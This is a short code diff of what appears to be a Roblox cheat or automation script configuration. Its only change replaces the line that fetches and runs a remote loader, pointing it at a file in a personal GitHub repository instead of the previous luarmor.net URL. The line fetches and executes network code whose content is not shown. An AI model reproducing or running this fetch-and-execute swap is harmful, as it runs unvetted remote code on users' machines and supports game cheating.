@@ -49,4 +49,4 @@ getgenv().MailboxCombinedConfig = getgenv().MailboxCombinedConfig or {
         SameServer = false,
     },
 }
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/8f7376a9396d020206a4c1dfd8babf7e.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/quocnats01959-cyber/hi/refs/heads/main/cccc.lua"))()
